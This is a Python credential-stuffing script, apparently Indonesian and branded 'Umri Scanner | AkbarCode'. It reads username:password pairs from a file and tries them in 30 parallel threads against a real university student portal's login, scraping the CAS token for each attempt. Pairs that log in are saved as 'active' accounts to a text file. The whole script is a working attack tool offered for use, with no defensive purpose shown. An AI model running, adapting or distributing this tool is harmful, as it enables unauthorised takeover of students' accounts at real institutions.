import os, time, json, random, platform, urllib.parse, requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
from concurrent.futures import ThreadPoolExecutor
import os, time, random, platform, hashlib, sys, urllib.parse, requests.packages.urllib3
import os, time, platform, requests as req, requests.packages.urllib3
try:
	import requests as req
	from bs4 import BeautifulSoup as bs
except:
	os.system('pip install --upgrade pip')
	os.system('pip install requests bs4')
	os.system('clear')
	exit('Install bahan selesai\nSilahkan restart script')
else:
	grey = '\x1b[90m'
	red = '\x1b[91m'
	green = '\x1b[92m'
	yellow = '\x1b[93m'
	blue = '\x1b[94m'
	purple = '\x1b[95m'
	cyan = '\x1b[96m'
	white = '\x1b[37m'
	bold = '\033[1m'
	flag = '\x1b[47;30m'
	off = '\x1b[m'
	rv = platform.uname()
	me = rv.release
	found = []
	alumni = []
	error = []
	xtc = []

os.system('clear')
def unair(i, usr, pwd):
	ses = req.Session()
	url = 'https://infokhs.umm.ac.id/'
	tok = bs(ses.get(url).text, 'html.parser').findAll('input')
	dat = { 'username':usr, 'password':pwd, 'execution': tok[2]['value'], '_eventId':'submit', 'submit':'login'}
	post = bs(ses.post(url, data=dat).text, 'html.parser').text
	if "SIAK Mahasiswa UPI Terintegrasi" in post:
		print(f"{off}{bold}{white}[{green}AKTIF{off}{bold}{white}]{bold}{white}-> {bold}{green}{usr}{bold}{white}:{bold}{green}{pwd}{off}")
		found.append(f"{usr}")
		with open('aktif_upi.txt', 'a') as save:
		    save.write(f"{usr}:{pwd}\n")
	else:
		print(f"{off}{bold}{white}[{red}MODAR{off}{bold}{white}]{bold}{white}-> {bold}{red}{usr}{bold}{white}:{bold}{red}{pwd}{off}")
		error.append(f"{usr}")
	
def main():
	print(f"  ________________________")
	print(f" [{blue}{off}{flag} Umri Scanner | AkbarCode {off}]")
	print(" https://t.me/Akbar218")
	print("")
	print(f" {purple}[{white}+{purple}]{white} File harus berisi username & password")
	path = input(f" {purple}[{white}?{purple}]{white} Input file : ")
	with open(path, 'r') as (file):
		lines = file.readlines()
		count = 1
		print(f" {purple}[{white}+{purple}]{white} Total {len(lines)} baris terdeteksi")
		print("")
		with ThreadPoolExecutor(max_workers=30) as crot:
			for line in lines:
				user = line.strip().split(':')[0]
				pswd = line.strip().split(':')[1]
				crot.submit(unair, count, user, pswd)
				count += 1
				continue

		print("")
		print(f" {green}[{white}!{green}]{white} Scan selesai")
		print(f" {purple}[{white}*{purple}]{white} AKTIF : {green}{len(found)}")
		print(f" {purple}[{white}*{purple}]{white} ALUMNI : {green}{len(alumni)}")
		print(f" {purple}[{white}*{purple}]{white} MODAR : {red}{len(error)}")
		print(f" {green}[{white}!{green}]{white} Akun aktif disimpan")
		print(f" {cyan}[{white}*{cyan}]{white} Subscribe : {green}~")

		
	
if __name__ == '__main__':
	
	main()
